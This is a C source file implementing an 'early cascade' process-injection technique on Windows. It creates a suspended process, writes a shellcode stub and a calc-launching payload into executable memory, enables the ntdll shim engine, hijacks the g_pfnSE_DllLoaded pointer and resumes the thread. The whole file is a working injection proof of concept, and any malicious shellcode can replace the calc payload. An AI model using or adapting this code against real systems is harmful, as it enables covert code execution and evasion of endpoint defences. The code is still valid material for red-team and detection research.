#include <windows.h>
#include <stdio.h>

// Thanks to Cracked5pider for the cascade stub payload
unsigned char cascade_stub_x64[] = {
    0x48, 0x83, 0xec, 0x38, 0x33, 0xc0, 0x45, 0x33, 0xc9, 0x48, 0x21, 0x44, 0x24, 0x20, 0x48, 0xba,                                       
    0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0xa2, 0x99, 0x99, 0x99, 0x99, 
    0x99, 0x99, 0x99, 0x99, 0x49, 0xb8, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 
    0x77, 0x48, 0x8d, 0x48, 0xfe, 0x48, 0xb8, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 
    0x66, 0x66, 0xff, 0xd0, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x38, 0xc3                                          
}; 

unsigned char Payload[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

// Section Stepper function
PVOID StepThroughSections(IN PVOID pModuleBase, IN PCHAR lpSection)
{
    printf("[*] Stepping Through Sections... ");
    
    PBYTE pBase = (PBYTE)pModuleBase;

    // Getting dos header
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBase;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return;

    // Getting Nt Headers
    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pDosHeader->e_lfanew);
    if (pNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return;

    // Get Section Headers
    PIMAGE_SECTION_HEADER pSecHdr = IMAGE_FIRST_SECTION(pNtHdrs);

    for (int i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++)
    {
        if (memcmp(lpSection, pSecHdr[i].Name, strlen(lpSection)) == 0)
        {
            printf("[+] Found \"%s\" Section...\n", lpSection);
            return pBase + pSecHdr[i].VirtualAddress;
        }
    }
    
    return;
}

LPVOID SysEncodeFnPointer(
    _In_ PVOID FnPointer
) {
    ULONG SharedUserCookie = *(ULONG*)0x7FFE0330;

    return (void*)_rotr64((uintptr_t)(SharedUserCookie ^ (uintptr_t)FnPointer), SharedUserCookie & 0x3F);
}

/*
    @CacadeInjection Function:
        1. Create New Process To Be Injected.
        2. Allocate mem to hold 2 part payload
        3. Get Sections needed from local ntdll.dll
           and add offset of ShimsEnabled and pfnSE_DllLoaded pointers
        4. updating stub to include g_ShimsEnabled, Payload and
           NtQueueApcThread.
        5. Write the stub, payload into allocated memory.
        6. patch the remote process pointer and enable the shim engine
        7. Resume Thread.
*/
BOOL CascadeInjection(IN PBYTE pPayload, SIZE_T payloadSize, PSTR ProcName)
{
    PVOID               g_Value = NULL;
    PVOID               remoteAddress = NULL;
    PVOID               SecMrData = {0};
    PVOID               SecData = {0};
    PVOID               g_ShimsEnabled = {0};
    PVOID               g_pfnSE_DllLoaded = {0};
    SIZE_T              Length = {0};
    STARTUPINFO         si = {0};
    PROCESS_INFORMATION pi = {0};

    // Clearing structs
    RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(STARTUPINFO);

    //
    //  Creating Process
    //
    if (!CreateProcessA(ProcName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {
        printf("[-] CreateProcess Failed : %d\n", GetLastError());
        goto _LEAVE;
    }
    printf("[*] Created Process @ PID: %d | dwCreationFlag -> CREATE_SUSPENDED\n", pi.dwProcessId);
    //
    //  Allocating Memory For 2 Part Payload
    //

    Length = sizeof(cascade_stub_x64) + payloadSize; // Size of both cascade stub and payload.

    if (!(remoteAddress = VirtualAllocEx(pi.hProcess, 0, Length, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)))
    {
        printf("[-] VirtualAllocEx Failed : %d\n", GetLastError());
        goto _LEAVE;
    }
    printf("[0x%p] Allocated Memory For 2 Part Payload...\n\n", remoteAddress);
    
    //
    //  Getting Section Address and
    //  Adding offsets to the pointers.
    //
    
    SecMrData = StepThroughSections(GetModuleHandle(TEXT("NTDLL")), ".mrdata");
    SecData = StepThroughSections(GetModuleHandle(TEXT("NTDLL")), ".data");

    g_ShimsEnabled = (PVOID)((UINT_PTR)SecData + 0x6cf0);		// Offsets to the pointers
    g_pfnSE_DllLoaded = (PVOID)((UINT_PTR)SecMrData + 0x270);

    printf("[.DATA] g_ShimsEnabled      : %p\n", g_ShimsEnabled);
    printf("[.MRDATA] g_pfnSE_DllLoaded : %p\n\n", g_pfnSE_DllLoaded);

    //
    //  Updating the stub to include g_ShimsEnabled,
    //  Payload and NtQueueApcThread pointers.
    //  All size is set to PVOID since that is worth
    //  8 Bytes. Address is worth 8 bytes
    //

    // Replacing 0x88 bytes with remoteAddress + sizeof(cascade_stub_x64)
    g_Value = (UINT_PTR)remoteAddress + sizeof(cascade_stub_x64);
    memcpy(&cascade_stub_x64[16], &g_Value, sizeof(PVOID));

    // Replacing 0x99 bytes with the address to g_ShimsEnabled
    memcpy(&cascade_stub_x64[25], &g_ShimsEnabled, sizeof(PVOID));

    // Replacing 0x77 bytes with the size of cascade_stub_x64 and PayloadSize combined
    g_Value = (UINT_PTR)remoteAddress + sizeof(cascade_stub_x64) + payloadSize;
    memcpy(&cascade_stub_x64[35], &g_Value, sizeof(PVOID));
    
    // Replacing 0x66 bytes with the address to NtQueueApcThread
    g_Value = (UINT_PTR)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQueueApcThread");
    memcpy(&cascade_stub_x64[49], &g_Value, sizeof(PVOID));

    //
    //  Write stub and payload into allocated memory
    //

    BYTE Offset = 0;

    // Writing the stub into the beginning of the allocated memory
    if (!WriteProcessMemory(pi.hProcess, (PVOID)((UINT_PTR)remoteAddress + Offset), cascade_stub_x64, sizeof(cascade_stub_x64), NULL))
    {
        printf("[-] WriteProcessMemory [1] Failed %d\n", GetLastError());
        goto _LEAVE;
    }
    printf("[*] Written Stub Payload @ 0x%p\n", remoteAddress);

    // Writing the calc payload into memory just after stub
    Offset += sizeof(cascade_stub_x64);
    if (!WriteProcessMemory(pi.hProcess, (PVOID)((UINT_PTR)remoteAddress + Offset), Payload, payloadSize, NULL))
    {
        printf("[-] WriteProcessMemory [2] Failed %d\n", GetLastError());
        goto _LEAVE;
    }
    printf("[*] Written Calc Payload To Remote Address @ 0x%p\n", remoteAddress);

    //
    //  Patch the remote process pointer and enable the shim engine
    //
    
    g_Value = TRUE;
    if (!WriteProcessMemory(pi.hProcess, g_ShimsEnabled, &g_Value, sizeof(BYTE), NULL)) {
        printf("[-] WriteProcessMemory [3] Failed %d\n", GetLastError());
        goto _LEAVE;
    }
    printf("[*] Set g_ShimsEnabled To \"TRUE\"... \n");

    // This will write the function pointer to our shellcode into the g_pfnSE_DllLoaded pointer.
    g_Value = (UINT_PTR)(SysEncodeFnPointer(remoteAddress));
    if (!WriteProcessMemory(pi.hProcess, g_pfnSE_DllLoaded, &g_Value, sizeof(PVOID), NULL)) {
        printf("[-] WriteProcessMemory [4] Failed %d\n", GetLastError());
        goto _LEAVE;
    }
    printf("[*] Pointed \"g_pfnSE_DllLoaded\" To Our Remote Address... \n");

    
    if (!ResumeThread(pi.hThread))
    {
        printf("[-] Resume Thread Failed %d\n", GetLastError());
        goto _LEAVE;
    }
    
_LEAVE:
    if (pi.hProcess)
        CloseHandle(pi.hProcess);
    if (pi.hThread)
        CloseHandle(pi.hThread);
    return TRUE;
}

int main(int argc, char** argv[])
{
    if (argc != 2)
    {
        printf("Usage: %s <ProcName>\n", argv[0]);
        return -1;
    }
    printf("\n");
    
    // Cascade function called here
    CascadeInjection(Payload, sizeof(Payload), argv[1]);
   
    return 0;
}
